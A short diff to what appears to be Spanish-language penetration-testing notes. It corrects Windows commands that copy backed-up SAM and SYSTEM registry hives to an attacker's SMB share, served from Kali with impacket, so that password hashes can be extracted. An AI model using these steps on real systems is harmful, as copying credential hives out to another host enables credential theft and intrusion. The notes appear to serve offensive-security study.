@@ -68,10 +68,8 @@ impacket-smb smbfolder $(pwd) --smb2support
 Copiar los archivos:
 
 ```bash
-copy sam.backup \IP
-ecursolinux\sam
-copy system.backup \IP
-ecursoLinux\system
+copy sam.backup \\IP\recursolinux\sam
+copy system.backup \\IP\recursoLinux\system
 ```
 
 Tener los archivos `sam` y `system` en Kali y ejecutar:
